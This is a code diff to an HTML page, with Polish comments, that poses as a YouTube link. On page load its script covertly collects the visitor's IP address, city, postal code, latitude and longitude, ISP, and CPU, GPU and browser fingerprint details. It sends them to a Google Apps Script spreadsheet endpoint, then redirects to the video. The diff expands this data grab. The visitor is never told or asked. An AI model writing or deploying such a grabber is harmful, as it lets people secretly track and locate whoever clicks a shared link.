@@ -6,26 +6,118 @@
 </head>
 <body>
     <script>
-        const GOOGLE_SHEETS_URL = "https://script.google.com/macros/s/AKfycbzhCFh2H-LiQWzjzSknJLiXuU4uX6J5JfV42LYFNPCw2vv423GT8Wjb0rR_Hcd-3bx9HA/exec";
-        const VIDEO_ID = "dQw4w9WgXcQ"; // ID FILMU YOUTUBE
+
+        const GOOGLE_SHEETS_URL = "https://script.google.com/macros/s/TWOJ_URL/exec"; 
+        const VIDEO_ID = "dQw4w9WgXcQ";
         
+
+        async function getIPAndLocation() {
+            try {
+
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                return {
+                    ip: data.ip || 'unknown',
+                    city: data.city || 'unknown',
+                    region: data.region || 'unknown',
+                    country: data.country_name || 'unknown',
+                    country_code: data.country_code || 'unknown',
+                    postal: data.postal || 'unknown',
+                    latitude: data.latitude || 'unknown',
+                    longitude: data.longitude || 'unknown',
+                    timezone: data.timezone || 'unknown',
+                    isp: data.org || 'unknown'
+                };
+            } catch(e) {
+                console.warn('ipapi.co failed, trying fallback...', e);
+
+                try {
+                    const response2 = await fetch('https://api.ipify.org?format=json');
+                    const data2 = await response2.json();
+                    return {
+                        ip: data2.ip,
+                        city: 'unknown',
+                        region: 'unknown',
+                        country: 'unknown',
+                        latitude: 'unknown',
+                        longitude: 'unknown',
+                        isp: 'unknown',
+                        error: e.toString()
+                    };
+                } catch(e2) {
+                    return { ip: 'unknown', error: e2.toString() };
+                }
+            }
+        }
+
+        function getCPUDetails() {
+            try {
+                const cores = navigator.hardwareConcurrency || 'unknown';
+                let vendor = 'unknown';
+                let model = 'unknown';
+                let architecture = 'unknown';
+
+                const ua = navigator.userAgent;
+
+                if (ua.includes('Intel')) vendor = 'Intel';
+                if (ua.includes('AMD')) vendor = 'AMD';
+                if (ua.includes('Apple') || ua.includes('Mac')) vendor = 'Apple';
+                if (ua.includes('Qualcomm')) vendor = 'Qualcomm';
+                if (ua.includes('MediaTek')) vendor = 'MediaTek';
+
+                if (ua.includes('x64') || ua.includes('x86_64')) architecture = '64-bit';
+                if (ua.includes('arm') || ua.includes('ARM')) architecture = 'ARM';
+                if (ua.includes('aarch64')) architecture = 'ARM64';
+
+                const platformMatch = ua.match(/\(([^)]+)\)/);
+                if (platformMatch) {
+                    const platform = platformMatch[1];
+                    if (platform.includes('Mac')) model = 'Apple Silicon / Intel Mac';
+                    if (platform.includes('Windows')) model = 'Windows PC';
+                    if (platform.includes('Linux')) model = 'Linux Machine';
+                    if (platform.includes('Android')) model = 'Android Device';
+                    if (platform.includes('iPhone') || platform.includes('iPad')) model = 'Apple A-series';
+                }
+             
+                const ram = navigator.deviceMemory ? navigator.deviceMemory + ' GB' : 'unknown';
+                
+                return {
+                    cores: cores,
+                    vendor: vendor,
+                    model: model,
+                    architecture: architecture,
+                    ram: ram
+                };
+            } catch(e) {
+                return { cores: 'unknown', vendor: 'error', model: 'error', architecture: 'error', ram: 'error' };
+            }
+        }
+  
         function getGPU() {
             try {
                 const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (!gl) return 'unknown';
+                let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl') || canvas.getContext('webgl2');
+                
+                if (!gl) {
+                    return 'WebGL not supported';
+                }
+                
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                if (!debugInfo) return 'unknown';
-                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                if (debugInfo) {
+                    const gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                    const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
+                    if (gpu && vendor) return `${vendor} | ${gpu}`;
+                    return gpu || 'unknown';
+                }
+                
+                const renderer = gl.getParameter(gl.RENDERER);
+                return renderer || 'unknown';
             } catch(e) {
-                return 'error';
+                return 'error: ' + e.message;
             }
         }
-        
-        function getCPU() {
-            return navigator.hardwareConcurrency || 'unknown';
-        }
-        
+      
         function getMemory() {
             return navigator.deviceMemory || 'unknown';
         }
@@ -76,60 +168,66 @@
             return 0;
         }
         
-        function getXFF() {
-        
-            return 'unknown';
+        function getScreenResolution() {
+            return `${screen.width}x${screen.height}`;
         }
-        
       
-        async function getIP() {
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                return data.ip;
-            } catch(e) {
-              
-                try {
-                    const response2 = await fetch('https://api.my-ip.io/ip.json');
-                    const data2 = await response2.json();
-                    return data2.ip;
-                } catch(e2) {
-                    return 'unknown';
-                }
-            }
-        }
-        
-    
-        async function collectData() {
-            const ip = await getIP();
+        async function collectAllData() {
+            console.log('🔍 Zbieranie danych...');
+            
+            const gpu = getGPU();
+            const cpuDetails = getCPUDetails();
+            const location = await getIPAndLocation();
             
             return {
-                ip: ip,
-                userAgent: navigator.userAgent,
-                gpu: getGPU(),
-                cpu: getCPU(),
-                memory: getMemory(),
-                language: getLanguage(),
+                // Lokalizacja
+                ip: location.ip,
+                city: location.city,
+                region: location.region,
+                country: location.country,
+                country_code: location.country_code,
+                postal: location.postal,
+                latitude: location.latitude,
+                longitude: location.longitude,
+                isp: location.isp,
+                timezone: location.timezone,
+                
+                // CPU – szczegóły
+                cpu_cores: cpuDetails.cores,
+                cpu_vendor: cpuDetails.vendor,
+                cpu_model: cpuDetails.model,
+                cpu_architecture: cpuDetails.architecture,
+                cpu_ram: cpuDetails.ram,
+                
+                // GPU
+                gpu: gpu,
+                
+                // System
                 platform: getPlatform(),
-                timezone: getTimezone(),
-                connectionType: getConnectionType(),
-                pluginsCount: getPluginsCount(),
-                colorDepth: getColorDepth(),
-                inApp: isInApp(),
-                xff: getXFF(),
-                videoId: VIDEO_ID
+                userAgent: navigator.userAgent,
+                language: getLanguage(),
+                screen_resolution: getScreenResolution(),
+                color_depth: getColorDepth(),
+                plugins_count: getPluginsCount(),
+                
+                // Połączenie
+                connection_type: getConnectionType(),
+                in_app: isInApp(),
+                
+                // Film
+                video_id: VIDEO_ID,
+                
+                // Znacznik czasu
+                timestamp: new Date().toISOString()
             };
         }
-        
-     
+      
         async function saveToGoogleSheets(data) {
             try {
-                const response = await fetch(GOOGLE_SHEETS_URL, {
+                await fetch(GOOGLE_SHEETS_URL, {
                     method: 'POST',
-                    mode: 'no-cors', 
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    mode: 'no-cors',
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data)
                 });
                 console.log('✅ Dane wysłane do Google Sheets');
@@ -137,20 +235,19 @@
                 console.error('❌ Błąd wysyłania:', e);
             }
         }
-        
-       
+     
         async function main() {
-            console.log('Zbieranie danych...');
-            const data = await collectData();
-            console.log('Dane zebrane:', data);
+            console.log(' Start...');
+            const data = await collectAllData();
+            console.log(' Zebrane dane:', data);
             
             await saveToGoogleSheets(data);
-            console.log('Przekierowanie na YouTube...');
             
-          
+            console.log('🔁 Przekierowanie na YouTube...');
             window.location.href = 'https://www.youtube.com/watch?v=' + VIDEO_ID;
         }
         
+        // Uruchom
         main();
     </script>
 </body>
